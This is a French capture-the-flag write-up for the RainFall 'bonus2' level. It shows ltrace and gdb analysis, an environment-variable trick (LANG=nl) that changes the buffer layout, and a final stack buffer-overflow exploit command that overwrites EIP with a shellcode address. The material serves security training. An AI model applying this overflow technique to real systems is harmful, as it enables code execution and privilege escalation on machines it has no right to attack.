On trouve un executable qui demande deux arguments pour afficher 
"Hello" + " " + "argv[1]".

Surement un login / mot de passe.

En essayant de faire segfault le programme et via https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/ on ne trouve pas d'offset.

ltrace ./bonus2 salut felix
__libc_start_main(0x8048529, 3, 0xbffff6d4, 0x8048640, 0x80486b0 <unfinished ...>
strncpy(0xbffff5d0, "salut", 40)                 = 0xbffff5d0
strncpy(0xbffff5f8, "felix", 32)                 = 0xbffff5f8
getenv("LANG")                                   = "en_US.UTF-8"
memcmp(0xbfffff16, 0x804873d, 2, 0xb7fff918, 0)  = -1
memcmp(0xbfffff16, 0x8048740, 2, 0xb7fff918, 0)  = -1
strcat("Hello ", "salut")                        = "Hello salut"
puts("Hello salut"Hello salut
)                              = 12

On voit avec ltrace qu'il y a 2 strncpy avec les deux arguments, puis un appel 
getenv("LANG") , puis deux memcmp, et enfin strcat et puts.

   0x0804859f <+118>:	movl   $0x8048738,(%esp)
   0x080485a6 <+125>:	call   0x8048380 <getenv@plt>

(gdb) x/s0x8048738
0x8048738:	 "LANG"

    0x080485c4 <+155>:	movl   $0x804873d,0x4(%esp)

(gdb) x/s 0x804873d
0x804873d:	 "fi"

0x080485f3 <+202>:	movl   $0x8048740,0x4(%esp)
    (gdb) x/s 0x804873d 
0x804873d:	 "fi"


On se rends compte que les memcmp compare la value de getenv avec "nl" et "fi"

on va changer la variable d'env LANG

export LANG=nl

On relance le programme :

bonus2@RainFall:~$ ./bonus2 salut felix
Goedemiddag! salut

On voit un changement ! 

Reesayons les patterns pour voir si ca change et que ca segfault toujours:

EIP Value: 0x38614137

Offset:23

On trouve un offset sur EIP !! Plus qu'a tomber sur l'adresse du shellcode comme dans d'autres level ! 

Le programme segfault car strcat essaye de concatenner 72 byte du buffer du main dans les 64 du buffer greetuser ! 

payload :

"40char min remplir le premier buffer" + "offset 23" + "adresse env shellcode"



./bonus2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6A $(python -c 'print "A"*23 + "\x31\xf8\xff\xbf"')